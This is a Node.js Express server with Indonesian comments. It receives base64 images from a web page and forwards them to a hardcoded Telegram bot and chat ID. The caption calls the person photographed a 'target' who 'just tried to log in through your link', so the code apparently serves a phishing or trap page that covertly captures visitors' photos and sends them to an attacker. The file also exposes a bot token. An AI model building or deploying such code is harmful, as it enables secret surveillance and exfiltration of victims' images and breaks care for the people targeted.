const express = require('express');
const app = express();

// Tingkatkan limit agar foto tidak terpotong saat dikirim
app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

// Data Telegram asli milik kamu yang sudah kamu buat
const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

app.post('/simpan', async (req, res) => {
    const base64Data = req.body.image;

    if (!base64Data) {
        return res.json({ status: false, msg: "Gambar tidak ada" });
    }

    try {
        // 1. Ambil data base64 gambarnya saja
        const base64Image = base64Data.split(';base64,').pop();
        
        // 2. Ubah jadi Buffer (lebih stabil untuk Node.js)
        const buffer = Buffer.from(base64Image, 'base64');

        // 3. Siapkan paket pengiriman ke Telegram
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        // Bungkus buffer ke dalam Blob agar terbaca sebagai file gambar
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'tangkapan.jpg');
        
        formData.append('caption', '📸 *TARGET TERDETEKSI!*\n\nSeseorang baru saja mencoba login melalui link kamu.');
        formData.append('parse_mode', 'Markdown');

        // 4. Kirim ke bot Telegram
        const teleRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const hasil = await teleRes.json();
        
        if (hasil.ok) {
            console.log("✅ Berhasil! Foto sudah meluncur ke Telegram kamu.");
            res.json({ status: true });
        } else {
            console.log("❌ Gagal Kirim:", hasil.description);
            res.json({ status: false, error: hasil.description });
        }
    } catch (err) {
        console.error("🔥 Error Server:", err.message);
        res.json({ status: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('🚀 Server Aktif di Port ' + PORT));